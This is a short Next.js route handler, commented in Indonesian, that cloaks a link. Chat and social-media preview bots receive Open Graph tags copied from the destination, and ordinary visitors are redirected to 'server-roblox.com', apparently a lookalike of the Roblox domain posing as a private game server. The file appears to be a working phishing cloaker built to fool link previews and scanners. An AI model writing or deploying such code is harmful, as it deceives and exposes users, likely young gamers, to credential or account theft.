import { NextRequest, NextResponse } from 'next/server';

async function fetchMetaTags(url: string) {
  const res = await fetch(url);
  const html = await res.text();
  // Ambil meta tag og:title, og:description, og:image
  const ogTitle = html.match(/<meta[^>]*property=["']og:title["'][^>]*content=["']([^"']*)["'][^>]*>/i)?.[1] || '';
  const ogDesc = html.match(/<meta[^>]*property=["']og:description["'][^>]*content=["']([^"']*)["'][^>]*>/i)?.[1] || '';
  const ogImage = html.match(/<meta[^>]*property=["']og:image["'][^>]*content=["']([^"']*)["'][^>]*>/i)?.[1] || '';
  return { ogTitle, ogDesc, ogImage };
}

export async function GET(req: NextRequest) {
  const userAgent = req.headers.get('user-agent') || '';
  const isBot = /discord|whatsapp|twitter|facebook|bot|crawler|spider/i.test(userAgent);
  const targetUrl = 'https://server-roblox.com/games/126884695634066/Grow-a-Garden?privateServerLinkCode=60996196158654546780483711157260'; // Ganti dengan link tujuan

  if (isBot) {
    // Fetch meta tag asli dari targetUrl
    const { ogTitle, ogDesc, ogImage } = await fetchMetaTags(targetUrl);
    return new NextResponse(`
      <html>
        <head>
          <meta property="og:title" content="${ogTitle}" />
          <meta property="og:description" content="${ogDesc}" />
          <meta property="og:image" content="${ogImage}" />
        </head>
        <body>
          <p>Redirecting...</p>
        </body>
      </html>
    `, {
      status: 200,
      headers: {
        'Content-Type': 'text/html',
      },
    });
  } else {
    // Redirect user biasa
    return NextResponse.redirect(targetUrl, 302);
  }
} 